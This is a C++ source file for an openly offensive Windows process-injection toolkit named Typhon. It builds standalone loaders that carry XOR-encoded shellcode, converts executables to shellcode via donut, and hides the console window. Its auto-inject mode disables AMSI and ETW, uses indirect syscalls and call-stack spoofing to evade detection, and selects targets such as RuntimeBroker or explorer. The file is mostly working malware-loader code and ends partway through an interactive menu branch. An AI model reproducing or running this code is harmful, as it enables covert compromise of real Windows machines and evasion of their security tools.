// ============================================================================
// Typhon — Evasive Process Injection Toolkit
// ============================================================================
// Uses the v5 engine's entire infrastructure:
//   - Tartarus Gate for SSN extraction (hook-resilient)
//   - SyscallManager for indirect syscall trampolines
//   - CallContext for call-stack spoofing (VEH + CET)
//   - PEB walking for all API resolution (zero IAT)
//   - Section-backed memory injection (no VirtualAllocEx)
//   - PRNG-driven variant selection
//   - RC4 encrypted shellcode with runtime decryption
//   - Zero-patch AMSI/ETW bypass
//
// All 8 PoolParty variants implemented. Runtime-selected from allowed set.
// ============================================================================

#include "config.h"
#include "peb_lookup.h"
#include "hashing.h"
#include "tartarus.h"
#include "syscall_manager.h"
#include "call_context.h"
#include "prng.h"
#include "crypto.h"
#include "variants.h"
#include "amsi_etw.h"

#include <intrin.h>
#include <tlhelp32.h>

// ============================================================================
// Embedded shellcode trailer — appended to end of exe by -build mode
// ============================================================================

#pragma pack(push, 1)
struct EmbeddedTrailer {
    uint32_t Magic;             // 'PP' + version = 0x50503031
    uint32_t ShellcodeSize;     // Size of shellcode blob
    uint16_t VariantMask;       // Allowed variants
    uint16_t Flags;             // Bit 0: silent mode (no console output)
    int64_t  TimerDelayMs;      // Timer delay for V8
    uint8_t  XorKey;            // Single-byte XOR key for shellcode
    uint8_t  Reserved[7];       // Padding to 32 bytes
};
#pragma pack(pop)

#define EMBEDDED_MAGIC 0x50503031  // "PP01"

// ============================================================================
// Shellcode loading — from file or embedded
// ============================================================================

static uint8_t* g_Shellcode = nullptr;
static SIZE_T   g_ShellcodeSize = 0;

// Check if this exe has embedded shellcode (appended by -build mode)
static bool LoadEmbeddedShellcode(EmbeddedTrailer& outTrailer) {
    typedef DWORD(WINAPI* GetModuleFileNameA_t)(HMODULE, LPSTR, DWORD);
    typedef HANDLE(WINAPI* CreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    typedef DWORD(WINAPI* GetFileSize_t)(HANDLE, LPDWORD);
    typedef BOOL(WINAPI* ReadFile_t)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    typedef DWORD(WINAPI* SetFilePointer_t)(HANDLE, LONG, PLONG, DWORD);
    typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
    typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);

    HMODULE hK32 = Resolver::GetModuleByHash(HASH_MODULE(L"kernel32.dll"));
    if (!hK32) return false;

    auto pGetModFn   = (GetModuleFileNameA_t)Resolver::GetExportByHash(hK32, HASH_API("GetModuleFileNameA"));
    auto pCreateFile = (CreateFileA_t)Resolver::GetExportByHash(hK32, HASH_API("CreateFileA"));
    auto pGetFileSize = (GetFileSize_t)Resolver::GetExportByHash(hK32, HASH_API("GetFileSize"));
    auto pReadFile   = (ReadFile_t)Resolver::GetExportByHash(hK32, HASH_API("ReadFile"));
    auto pSetFilePtr = (SetFilePointer_t)Resolver::GetExportByHash(hK32, HASH_API("SetFilePointer"));
    auto pCloseHandle = (CloseHandle_t)Resolver::GetExportByHash(hK32, HASH_API("CloseHandle"));
    auto pVirtualAlloc = (VirtualAlloc_t)Resolver::GetExportByHash(hK32, HASH_API("VirtualAlloc"));

    if (!pGetModFn || !pCreateFile || !pGetFileSize || !pReadFile ||
        !pSetFilePtr || !pCloseHandle || !pVirtualAlloc) return false;

    // Get our own exe path
    char exePath[MAX_PATH] = {};
    if (pGetModFn(nullptr, exePath, MAX_PATH) == 0) return false;

    HANDLE hFile = pCreateFile(exePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD fileSize = pGetFileSize(hFile, nullptr);
    if (fileSize < sizeof(EmbeddedTrailer) + 64) {
        pCloseHandle(hFile);
        return false;
    }

    // Read trailer from end of file
    pSetFilePtr(hFile, -(LONG)sizeof(EmbeddedTrailer), nullptr, 2 /*FILE_END*/);
    DWORD bytesRead = 0;
    EmbeddedTrailer trailer = {};
    pReadFile(hFile, &trailer, sizeof(trailer), &bytesRead, nullptr);

    if (bytesRead != sizeof(trailer) || trailer.Magic != EMBEDDED_MAGIC ||
        trailer.ShellcodeSize == 0 || trailer.ShellcodeSize > (fileSize - sizeof(trailer))) {
        pCloseHandle(hFile);
        return false;
    }

    // Read shellcode (located just before the trailer)
    DWORD scOffset = fileSize - sizeof(EmbeddedTrailer) - trailer.ShellcodeSize;
    pSetFilePtr(hFile, (LONG)scOffset, nullptr, 0 /*FILE_BEGIN*/);

    g_Shellcode = (uint8_t*)pVirtualAlloc(nullptr, trailer.ShellcodeSize,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_Shellcode) {
        pCloseHandle(hFile);
        return false;
    }

    bytesRead = 0;
    BOOL ok = pReadFile(hFile, g_Shellcode, trailer.ShellcodeSize, &bytesRead, nullptr);
    pCloseHandle(hFile);

    if (!ok || bytesRead != trailer.ShellcodeSize) return false;

    // De-XOR the shellcode
    if (trailer.XorKey != 0) {
        for (DWORD i = 0; i < trailer.ShellcodeSize; i++) {
            g_Shellcode[i] ^= trailer.XorKey;
        }
    }

    g_ShellcodeSize = trailer.ShellcodeSize;
    outTrailer = trailer;
    return true;
}

static bool LoadShellcodeFromFile(const char* path) {
    // Resolve file APIs via PEB (no IAT)
    typedef HANDLE(WINAPI* CreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    typedef DWORD(WINAPI* GetFileSize_t)(HANDLE, LPDWORD);
    typedef BOOL(WINAPI* ReadFile_t)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
    typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);

    HMODULE hK32 = Resolver::GetModuleByHash(HASH_MODULE(L"kernel32.dll"));
    if (!hK32) return false;

    auto pCreateFile = (CreateFileA_t)Resolver::GetExportByHash(hK32, HASH_API("CreateFileA"));
    auto pGetFileSize = (GetFileSize_t)Resolver::GetExportByHash(hK32, HASH_API("GetFileSize"));
    auto pReadFile = (ReadFile_t)Resolver::GetExportByHash(hK32, HASH_API("ReadFile"));
    auto pCloseHandle = (CloseHandle_t)Resolver::GetExportByHash(hK32, HASH_API("CloseHandle"));
    auto pVirtualAlloc = (VirtualAlloc_t)Resolver::GetExportByHash(hK32, HASH_API("VirtualAlloc"));

    if (!pCreateFile || !pGetFileSize || !pReadFile || !pCloseHandle || !pVirtualAlloc) return false;

    HANDLE hFile = pCreateFile(path, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD fileSize = pGetFileSize(hFile, nullptr);
    if (fileSize == 0 || fileSize == INVALID_FILE_SIZE) {
        pCloseHandle(hFile);
        return false;
    }

    g_Shellcode = (uint8_t*)pVirtualAlloc(nullptr, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_Shellcode) {
        pCloseHandle(hFile);
        return false;
    }

    DWORD bytesRead = 0;
    BOOL ok = pReadFile(hFile, g_Shellcode, fileSize, &bytesRead, nullptr);
    pCloseHandle(hFile);

    if (!ok || bytesRead != fileSize) return false;

    g_ShellcodeSize = fileSize;
    return true;
}

// ============================================================================
// Command-line parsing (minimal, no CRT)
// ============================================================================

static DWORD ParsePid(const char* arg) {
    DWORD pid = 0;
    while (*arg >= '0' && *arg <= '9') {
        pid = pid * 10 + (*arg - '0');
        arg++;
    }
    return pid;
}

static uint16_t ParseVariantMask(const char* arg) {
    if (arg[0] == 'a' && arg[1] == 'l' && arg[2] == 'l') return PoolParty::VARIANT_ALL;
    if (arg[0] == 's' && arg[1] == 'a' && arg[2] == 'f' && arg[3] == 'e') return PoolParty::VARIANT_SAFE;
    if (arg[0] == 'r' && arg[1] == 'e' && arg[2] == 'c') return PoolParty::VARIANT_RECOMMENDED;
    if (arg[0] == 'd' && arg[1] == 'i' && arg[2] == 'r') return PoolParty::VARIANT_TP_DIRECT;
    if (arg[0] == 't' && arg[1] == 'i' && arg[2] == 'm') return PoolParty::VARIANT_TP_TIMER;
    if (arg[0] == 'i' && arg[1] == 'o') return PoolParty::VARIANT_IO_COMPLETION;
    if (arg[0] >= '1' && arg[0] <= '8') return (uint16_t)(1 << (arg[0] - '1'));
    return PoolParty::VARIANT_RECOMMENDED;
}

// ============================================================================
// Build mode — embed shellcode into a standalone exe
// ============================================================================
// Reads our own exe, appends XOR'd shellcode + trailer, writes output.
// The output exe runs with zero arguments — auto-injects on launch.

static bool StrEq(const char* a, const char* b) {
    while (*a && *b) {
        char ca = *a, cb = *b;
        if (ca >= 'A' && ca <= 'Z') ca += 32;
        if (cb >= 'A' && cb <= 'Z') cb += 32;
        if (ca != cb) return false;
        a++; b++;
    }
    return *a == *b;
}

static int DoBuild(int argc, char* argv[]) {
    // Parse: typhon.exe -build <input> [-o output.exe] [-variant X] [-delay ms] [-debug] [-donut path]
    const char* inputPath = nullptr;
    const char* outPath = "output.exe";
    const char* donutPath = nullptr;
    uint16_t variantMask = PoolParty::VARIANT_RECOMMENDED;
    int64_t timerDelay = 0;
    bool debugMode = false;

    for (int i = 2; i < argc; i++) {
        if (StrEq(argv[i], "-o") && i + 1 < argc) {
            outPath = argv[++i];
        } else if (StrEq(argv[i], "-variant") && i + 1 < argc) {
            variantMask = ParseVariantMask(argv[++i]);
        } else if (StrEq(argv[i], "-delay") && i + 1 < argc) {
            i++;
            const char* d = argv[i];
            timerDelay = 0;
            while (*d >= '0' && *d <= '9') { timerDelay = timerDelay * 10 + (*d - '0'); d++; }
        } else if (StrEq(argv[i], "-debug")) {
            debugMode = true;
        } else if (StrEq(argv[i], "-donut") && i + 1 < argc) {
            donutPath = argv[++i];
        } else if (!inputPath) {
            inputPath = argv[i];
        }
    }

    if (!inputPath) {
        printf("\n  Usage: typhon.exe -build <file> [-o output.exe] [options]\n\n");
        printf("  Input: .bin (raw shellcode), .exe/.dll (auto-converted via donut)\n\n");
        printf("  Options:\n");
        printf("    -o <path>       Output file (default: output.exe)\n");
        printf("    -variant <v>    Variant: all/safe/rec/direct/timer/io/1-8 (default: direct)\n");
        printf("    -delay <ms>     Timer delay for V8 (default: 0 = immediate)\n");
        printf("    -debug          Keep console output in built exe (for testing)\n");
        printf("    -donut <path>   Path to donut.exe (auto-detected if in PATH or same dir)\n\n");
        printf("  Examples:\n");
        printf("    typhon.exe -build payload.bin -o injector.exe\n");
        printf("    typhon.exe -build implant.exe -o loader.exe -variant direct\n");
        printf("    typhon.exe -build agent.dll -o out.exe -debug\n\n");
        return 1;
    }

    printf("\n  Typhon Builder\n");
    printf("  ==============\n\n");

    // ================================================================
    // Detect input type: raw shellcode (.bin) or PE (.exe/.dll)
    // ================================================================
    bool isPE = false;
    bool isNET = false;
    const char* scPath = inputPath;
    char tempScPath[MAX_PATH] = {};

    // Check file extension
    const char* ext = nullptr;
    for (const char* p = inputPath; *p; p++) {
        if (*p == '.') ext = p;
    }

    // Read first bytes to check for MZ header
    FILE* fCheck = fopen(inputPath, "rb");
    if (!fCheck) {
        printf("  [-] Cannot open input: %s\n", inputPath);
        return 1;
    }

    uint8_t peHeader[0x400] = {};
    fseek(fCheck, 0, SEEK_END);
    long inputFileSize = ftell(fCheck);
    fseek(fCheck, 0, SEEK_SET);
    size_t headerRead = fread(peHeader, 1, sizeof(peHeader), fCheck);
    fclose(fCheck);

    if (headerRead >= 2 && peHeader[0] == 'M' && peHeader[1] == 'Z') {
        isPE = true;

        // Check for .NET: look for CLR runtime header in PE data directories
        if (headerRead >= 0x100) {
            uint32_t peOff = *(uint32_t*)(peHeader + 0x3C);
            if (peOff > 0 && peOff + 0x18 < headerRead) {
                // Verify PE signature
                if (peHeader[peOff] == 'P' && peHeader[peOff+1] == 'E') {
                    uint16_t magic = *(uint16_t*)(peHeader + peOff + 24);
                    uint32_t clrRva = 0;
                    if (magic == 0x20B && peOff + 24 + 216 <= headerRead) {
                        // PE32+ (x64): NumberOfRvaAndSizes at offset 108 from opt header
                        uint32_t numDD = *(uint32_t*)(peHeader + peOff + 24 + 108);
                        if (numDD > 14) {
                            // CLR header is data directory entry 14 (0-indexed)
                            // Data dirs start at opt header + 112
                            size_t clrDirOff = peOff + 24 + 112 + 14 * 8;
                            if (clrDirOff + 8 <= headerRead) {
                                clrRva = *(uint32_t*)(peHeader + clrDirOff);
                                uint32_t clrSize = *(uint32_t*)(peHeader + clrDirOff + 4);
                                if (clrRva != 0 && clrSize >= 0x48) isNET = true;
                            }
                        }
                    } else if (magic == 0x10B && peOff + 24 + 200 <= headerRead) {
                        // PE32 (x86): NumberOfRvaAndSizes at offset 92 from opt header
                        uint32_t numDD = *(uint32_t*)(peHeader + peOff + 24 + 92);
                        if (numDD > 14) {
                            size_t clrDirOff = peOff + 24 + 96 + 14 * 8;
                            if (clrDirOff + 8 <= headerRead) {
                                clrRva = *(uint32_t*)(peHeader + clrDirOff);
                                uint32_t clrSize = *(uint32_t*)(peHeader + clrDirOff + 4);
                                if (clrRva != 0 && clrSize >= 0x48) isNET = true;
                            }
                        }
                    }
                }
            }
        }

        printf("  [+] Input:      %s (%s PE)\n", inputPath, isNET ? ".NET" : "Native");
        printf("  [*] Converting PE to shellcode via donut...\n");

        // Find donut.exe
        char donutExe[MAX_PATH] = {};
        bool donutFound = false;

        if (donutPath) {
            // User-specified path
            FILE* fTest = fopen(donutPath, "rb");
            if (fTest) { fclose(fTest); donutFound = true; }
            if (donutFound) {
                int k = 0;
                while (donutPath[k]) { donutExe[k] = donutPath[k]; k++; }
            }
        }

        if (!donutFound) {
            // Try same directory as typhon.exe
            char selfDir[MAX_PATH] = {};
            GetModuleFileNameA(nullptr, selfDir, MAX_PATH);
            // Strip filename
            int lastSlash = -1;
            for (int k = 0; selfDir[k]; k++) {
                if (selfDir[k] == '\\' || selfDir[k] == '/') lastSlash = k;
            }
            if (lastSlash >= 0) selfDir[lastSlash + 1] = 0;

            // Try: <selfdir>\donut.exe
            sprintf(donutExe, "%sdonut.exe", selfDir);
            FILE* fTest = fopen(donutExe, "rb");
            if (fTest) { fclose(fTest); donutFound = true; }

            // Try: <selfdir>\..\donut.exe
            if (!donutFound) {
                sprintf(donutExe, "%s..\\donut.exe", selfDir);
                fTest = fopen(donutExe, "rb");
                if (fTest) { fclose(fTest); donutFound = true; }
            }

            // Try: <selfdir>\..\..\donut.exe
            if (!donutFound) {
                sprintf(donutExe, "%s..\\..\\donut.exe", selfDir);
                fTest = fopen(donutExe, "rb");
                if (fTest) { fclose(fTest); donutFound = true; }
            }

            // Try PATH
            if (!donutFound) {
                sprintf(donutExe, "donut.exe");
                // Quick check via system
                char testCmd[512];
                sprintf(testCmd, "where donut.exe >nul 2>&1");
                if (system(testCmd) == 0) donutFound = true;
            }
        }

        if (!donutFound) {
            printf("  [-] donut.exe not found. Install donut or specify path with -donut\n");
            printf("      Download: https://github.com/TheWover/donut/releases\n");
            free((void*)0); // won't reach
            return 1;
        }

        printf("  [+] Donut:      %s\n", donutExe);

        // Build temp output path for donut
        GetTempPathA(MAX_PATH, tempScPath);
        int tLen = 0;
        while (tempScPath[tLen]) tLen++;
        sprintf(tempScPath + tLen, "pp_%08x.bin", (uint32_t)GetTickCount());

        // Build donut command — resolve to absolute paths for system() reliability
        char absInput[MAX_PATH] = {};
        char absOutput[MAX_PATH] = {};
        char absDonut[MAX_PATH] = {};
        GetFullPathNameA(inputPath, MAX_PATH, absInput, nullptr);
        GetFullPathNameA(tempScPath, MAX_PATH, absOutput, nullptr);
        GetFullPathNameA(donutExe, MAX_PATH, absDonut, nullptr);

        // -i input -o output -f 1 (binary) -a 2 (x64) -e 3 (random+encrypt)
        // -b 1 (NO bypass — we have our own AMSI/ETW bypass that's better)
        // -x 1 (exit thread)
        char cmd[2048];
        sprintf(cmd, "\"\"%s\" -i \"%s\" -o \"%s\" -f 1 -a 2 -e 3 -b 1 -x 1\"",
                absDonut, absInput, absOutput);

        int ret = system(cmd);
        if (ret != 0) {
            printf("  [-] Donut conversion failed (exit code %d)\n", ret);
            return 1;
        }

        // Verify output exists
        FILE* fTest = fopen(tempScPath, "rb");
        if (!fTest) {
            printf("  [-] Donut output not found: %s\n", tempScPath);
            return 1;
        }
        fclose(fTest);

        scPath = tempScPath;
        printf("  [+] Shellcode generated successfully\n");
    } else {
        printf("  [+] Input:      %s (raw shellcode)\n", inputPath);
    }

    // ================================================================
    // Read shellcode
    // ================================================================
    FILE* fSc = fopen(scPath, "rb");
    if (!fSc) {
        printf("  [-] Cannot open shellcode: %s\n", scPath);
        return 1;
    }
    fseek(fSc, 0, SEEK_END);
    long scSize = ftell(fSc);
    fseek(fSc, 0, SEEK_SET);

    if (scSize <= 0 || scSize > 16 * 1024 * 1024) {
        printf("  [-] Invalid shellcode size: %ld\n", scSize);
        fclose(fSc);
        return 1;
    }

    uint8_t* scBuf = (uint8_t*)malloc(scSize);
    if (!scBuf) { fclose(fSc); return 1; }
    fread(scBuf, 1, scSize, fSc);
    fclose(fSc);

    // Clean up temp file if we created one
    if (tempScPath[0]) {
        DeleteFileA(tempScPath);
    }

    // Generate XOR key from shellcode content (deterministic but non-zero)
    uint8_t xorKey = 0;
    for (long i = 0; i < scSize; i++) xorKey = (uint8_t)(xorKey * 31 + scBuf[i]);
    if (xorKey == 0) xorKey = 0x41;

    // XOR the shellcode
    for (long i = 0; i < scSize; i++) scBuf[i] ^= xorKey;

    // ================================================================
    // Read our own exe as template
    // ================================================================
    char exePath[MAX_PATH] = {};
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);

    FILE* fSelf = fopen(exePath, "rb");
    if (!fSelf) {
        printf("  [-] Cannot read self: %s\n", exePath);
        free(scBuf);
        return 1;
    }
    fseek(fSelf, 0, SEEK_END);
    long selfSize = ftell(fSelf);
    fseek(fSelf, 0, SEEK_SET);

    uint8_t* selfBuf = (uint8_t*)malloc(selfSize);
    if (!selfBuf) { fclose(fSelf); free(scBuf); return 1; }
    fread(selfBuf, 1, selfSize, fSelf);
    fclose(fSelf);

    // Strip existing embedded shellcode if present
    if ((DWORD)selfSize > sizeof(EmbeddedTrailer)) {
        EmbeddedTrailer* existingTrailer = (EmbeddedTrailer*)(selfBuf + selfSize - sizeof(EmbeddedTrailer));
        if (existingTrailer->Magic == EMBEDDED_MAGIC &&
            existingTrailer->ShellcodeSize > 0 &&
            existingTrailer->ShellcodeSize < (DWORD)selfSize) {
            selfSize -= (sizeof(EmbeddedTrailer) + existingTrailer->ShellcodeSize);
        }
    }

    // ================================================================
    // Build trailer and write output
    // ================================================================
    EmbeddedTrailer trailer = {};
    trailer.Magic = EMBEDDED_MAGIC;
    trailer.ShellcodeSize = (uint32_t)scSize;
    trailer.VariantMask = variantMask;
    trailer.Flags = debugMode ? 0x0000 : 0x0001;  // Bit 0: silent mode
    trailer.TimerDelayMs = timerDelay;
    trailer.XorKey = xorKey;

    FILE* fOut = fopen(outPath, "wb");
    if (!fOut) {
        printf("  [-] Cannot create output: %s\n", outPath);
        free(selfBuf); free(scBuf);
        return 1;
    }

    fwrite(selfBuf, 1, selfSize, fOut);
    fwrite(scBuf, 1, scSize, fOut);
    fwrite(&trailer, 1, sizeof(trailer), fOut);
    fclose(fOut);

    long totalSize = selfSize + scSize + (long)sizeof(trailer);

    // ================================================================
    // Patch PE subsystem: CONSOLE -> WINDOWS (no console flash)
    // Skip in debug mode so the console stays for diagnostic output
    // ================================================================
    if (!debugMode) {
        FILE* fPatch = fopen(outPath, "r+b");
        if (fPatch) {
            // Read e_lfanew (PE header offset) at offset 0x3C
            uint32_t peOffset = 0;
            fseek(fPatch, 0x3C, SEEK_SET);
            fread(&peOffset, sizeof(peOffset), 1, fPatch);

            if (peOffset > 0 && peOffset < (uint32_t)totalSize - 0x18) {
                // Verify PE signature
                uint32_t peSig = 0;
                fseek(fPatch, (long)peOffset, SEEK_SET);
                fread(&peSig, sizeof(peSig), 1, fPatch);

                if (peSig == 0x00004550) { // "PE\0\0"
                    // Subsystem field is at optional header offset +68 (0x44)
                    // Optional header starts at PE + 24
                    // For PE32+ (x64): Subsystem is at PE + 24 + 68 = PE + 92
                    long subsysOffset = (long)peOffset + 24 + 68;
                    uint16_t subsystem = 0;
                    fseek(fPatch, subsysOffset, SEEK_SET);
                    fread(&subsystem, sizeof(subsystem), 1, fPatch);

                    if (subsystem == 3) { // IMAGE_SUBSYSTEM_WINDOWS_CUI
                        subsystem = 2;    // IMAGE_SUBSYSTEM_WINDOWS_GUI
                        fseek(fPatch, subsysOffset, SEEK_SET);
                        fwrite(&subsystem, sizeof(subsystem), 1, fPatch);
                    }
                }
            }
            fclose(fPatch);
        }
    }

    printf("\n");
    printf("  [+] Shellcode:  %ld bytes\n", scSize);
    printf("  [+] XOR key:    0x%02X\n", xorKey);
    printf("  [+] Variant:    0x%04X\n", variantMask);
    if (timerDelay > 0) printf("  [+] Delay:      %lld ms\n", timerDelay);
    printf("  [+] Mode:       %s\n", debugMode ? "debug (console output)" : "release (silent, no console window)");
    if (isPE) printf("  [+] PE type:    %s\n", isNET ? ".NET (CLR bootstrap via donut)" : "Native (converted via donut)");
    printf("  [+] Output:     %s (%ld bytes)\n", outPath, totalSize);
    printf("  [+] No VC runtime needed -- runs on clean Windows 10/11\n\n");

    free(selfBuf);
    free(scBuf);
    return 0;
}

// ============================================================================
// Auto-target selection — find a suitable injection target
// ============================================================================
// Looks for long-running, same-session processes with active thread pools.
// Prefers: RuntimeBroker, sihost, taskhostw, explorer, svchost
// Avoids: GUI-only apps, critical system processes, our own PID

static DWORD FindSuitableTarget() {
    // Resolve process enumeration APIs via PEB
    typedef HANDLE(WINAPI* CreateToolhelp32Snapshot_t)(DWORD, DWORD);
    typedef BOOL(WINAPI* Process32FirstW_t)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL(WINAPI* Process32NextW_t)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
    typedef DWORD(WINAPI* GetCurrentProcessId_t)();
    typedef BOOL(WINAPI* ProcessIdToSessionId_t)(DWORD, DWORD*);

    HMODULE hK32 = Resolver::GetModuleByHash(HASH_MODULE(L"kernel32.dll"));
    if (!hK32) return 0;

    auto pSnapshot = (CreateToolhelp32Snapshot_t)Resolver::GetExportByHash(hK32, HASH_API("CreateToolhelp32Snapshot"));
    auto pFirst    = (Process32FirstW_t)Resolver::GetExportByHash(hK32, HASH_API("Process32FirstW"));
    auto pNext     = (Process32NextW_t)Resolver::GetExportByHash(hK32, HASH_API("Process32NextW"));
    auto pClose    = (CloseHandle_t)Resolver::GetExportByHash(hK32, HASH_API("CloseHandle"));
    auto pGetPid   = (GetCurrentProcessId_t)Resolver::GetExportByHash(hK32, HASH_API("GetCurrentProcessId"));
    auto pSessId   = (ProcessIdToSessionId_t)Resolver::GetExportByHash(hK32, HASH_API("ProcessIdToSessionId"));

    if (!pSnapshot || !pFirst || !pNext || !pClose || !pGetPid) return 0;

    DWORD myPid = pGetPid();
    DWORD mySession = 0;
    if (pSessId) pSessId(myPid, &mySession);

    HANDLE hSnap = pSnapshot(0x00000002 /*TH32CS_SNAPPROCESS*/, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    // Preferred targets — long-running, have thread pools, same session
    // Ranked by preference (lower index = higher priority)
    struct TargetCandidate {
        const wchar_t* name;
        int priority;   // lower = better
    };

    const TargetCandidate preferred[] = {
        { L"RuntimeBroker.exe",     1 },
        { L"sihost.exe",            2 },
        { L"taskhostw.exe",         3 },
        { L"explorer.exe",          4 },
        { L"dllhost.exe",           5 },
        { L"backgroundTaskHost.exe",6 },
        { L"SearchHost.exe",        7 },
        { L"ShellExperienceHost.exe",8 },
    };
    const int numPreferred = sizeof(preferred) / sizeof(preferred[0]);

    DWORD bestPid = 0;
    int bestPriority = 999;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);

    if (pFirst(hSnap, &pe)) {
        do {
            if (pe.th32ProcessID == myPid) continue;
            if (pe.th32ProcessID == 0 || pe.th32ProcessID == 4) continue;

            // Same session check
            if (pSessId) {
                DWORD procSession = 0;
                if (pSessId(pe.th32ProcessID, &procSession) && procSession != mySession)
                    continue;
            }

            // Check against preferred list
            for (int i = 0; i < numPreferred; i++) {
                // Case-insensitive wide compare
                const wchar_t* a = pe.szExeFile;
                const wchar_t* b = preferred[i].name;
                bool match = true;
                int j = 0;
                while (b[j]) {
                    wchar_t ca = a[j];
                    wchar_t cb = b[j];
                    if (ca >= L'A' && ca <= L'Z') ca += 32;
                    if (cb >= L'A' && cb <= L'Z') cb += 32;
                    if (ca != cb) { match = false; break; }
                    j++;
                }
                if (match && a[j] == 0 && preferred[i].priority < bestPriority) {
                    bestPid = pe.th32ProcessID;
                    bestPriority = preferred[i].priority;
                    break;
                }
            }
        } while (pNext(hSnap, &pe));
    }

    pClose(hSnap);
    return bestPid;
}

int main(int argc, char* argv[]) {
    LOG_INIT_TIMER();
    // ====================================================================
    // Mode 1: Build mode — embed shellcode into standalone exe
    // ====================================================================
    if (argc >= 2 && (StrEq(argv[1], "-build") || StrEq(argv[1], "--build"))) {
        return DoBuild(argc, argv);
    }

    // ====================================================================
    // Mode 2: Embedded shellcode — standalone exe built with -build
    // ====================================================================
    EmbeddedTrailer embeddedTrailer = {};
    bool hasEmbedded = LoadEmbeddedShellcode(embeddedTrailer);

    if (hasEmbedded && argc < 2) {
        // Auto-inject mode
        bool silent = (embeddedTrailer.Flags & 0x0001) != 0;

        Prng::SeedFromHardware();

        Tartarus::InitResult tr = Tartarus::Initialize();
        if (!tr.Success) return 1;
        if (!silent) {
            printf("  [+] Tartarus Gate: %d SSNs extracted", tr.TotalExtracted);
            if (tr.HookedStubs > 0) printf(" (%d recovered from hooks)", tr.HookedStubs);
            printf("\n");
        }

        SyscallManager::InitResult sr = SyscallManager::Initialize();
        if (!sr.Success) return 1;
        if (!silent) printf("  [+] Trampolines: %d gadgets (%d high-quality)\n", sr.TotalGadgets, sr.QualityGadgets);

        CallContext::InitResult cr = CallContext::Initialize();
        if (!cr.Success) return 1;
        if (!silent) printf("  [+] Call stack: %d return addrs, context %s, %s\n",
            cr.ReturnAddresses, cr.ContextStolen ? "stolen" : "synthetic",
            cr.CetDetected ? "CET active" : "VEH mode");

        // AMSI/ETW bypass — run before injection
        AmsiEtw::BypassResult ae = AmsiEtw::Run();
        if (!silent) {
            printf("  [+] AMSI: %s\n", ae.AmsiSuccess ? "bypassed" : "skipped");
            printf("  [+] ETW:  %d functions patched, TEB %s\n",
                ae.EtwFunctionsPatched, ae.TebSuppressed ? "suppressed" : "skipped");
        }

        DWORD targetPid = FindSuitableTarget();
        if (targetPid == 0) return 1;
        if (!silent) printf("  [+] Target: PID %u\n", targetPid);

        uint16_t variantMask = embeddedTrailer.VariantMask;
        if (variantMask == 0) variantMask = PoolParty::VARIANT_RECOMMENDED;

        if (!silent) printf("  [*] Injecting...\n");

        PoolParty::InjectResult ir = PoolParty::Inject(
            targetPid, g_Shellcode, g_ShellcodeSize,
            variantMask, embeddedTrailer.TimerDelayMs);

        if (!silent) {
            if (ir.Success) printf("  [+] Success\n");
            else printf("  [-] Failed\n");
        }

        // Cleanup
        if (g_Shellcode) {
            Crypto::SecureZero(g_Shellcode, g_ShellcodeSize);
            typedef BOOL(WINAPI* VirtualFree_t)(LPVOID, SIZE_T, DWORD);
            VirtualFree_t pVF = (VirtualFree_t)Resolver::ResolveAPI(
                HASH_MODULE(L"kernel32.dll"), HASH_API("VirtualFree"));
            if (pVF) pVF(g_Shellcode, 0, MEM_RELEASE);
            g_Shellcode = nullptr;
        }

        CallContext::Shutdown();
        SyscallManager::Shutdown();
        Tartarus::Shutdown();
        Prng::Seed(0);

        return ir.Success ? 0 : 1;
    }

    // ====================================================================
    // Mode 3: No args, no embedded — interactive builder
    // ====================================================================
    if (argc < 2) {
        printf("\n");
        printf("  Typhon -- Evasive Process Injection Toolkit\n");
        printf("  ============================================\n");
        printf("  Indirect Syscalls | Call-Stack Spoofing | Section-Backed Memory\n");
        printf("  AMSI/ETW Bypass | 8 Thread Pool Variants | Auto-Target Selection\n\n");

        printf("  [1] Build standalone exe (embed shellcode into portable exe)\n");
        printf("  [2] Inject from file    (load shellcode and inject now)\n");
        printf("  [3] Show help           (CLI usage and options)\n\n");

        printf("  > ");
        char choice[16] = {};
        if (!fgets(choice, sizeof(choice), stdin)) return 1;

        if (choice[0] == '1') {
            // Interactive build mode
            printf("\n  -- Build Standalone Executable --\n\n");

            // Input file
            printf("  Payload path (.bin / .exe / .dll): ");
            char inputBuf[MAX_PATH] = {};
            if (!fgets(inputBuf, sizeof(inputBuf), stdin)) return 1;
            // Strip newline
            for (int i = 0; inputBuf[i]; i++) { if (inputBuf[i] == '\n' || inputBuf[i] == '\r') inputBuf[i] = 0; }
            if (inputBuf[0] == 0) { printf("  [-] No input file\n"); return 1; }

            // Output file
            printf("  Output path [output.exe]: ");
            char outputBuf[MAX_PATH] = {};
            if (!fgets(outputBuf, sizeof(outputBuf), stdin)) return 1;
            for (int i = 0; outputBuf[i]; i++) { if (outputBuf[i] == '\n' || outputBuf[i] == '\r') outputBuf[i] = 0; }
            if (outputBuf[0] == 0) { outputBuf[0]='o'; outputBuf[1]='u'; outputBuf[2]='t'; outputBuf[3]='p'; outputBuf[4]='u'; outputBuf[5]='t'; outputBuf[6]='.'; outputBuf[7]='e'; outputBuf[8]='x'; outputBuf[9]='e'; outputBuf[10]=0; }

            // Variant
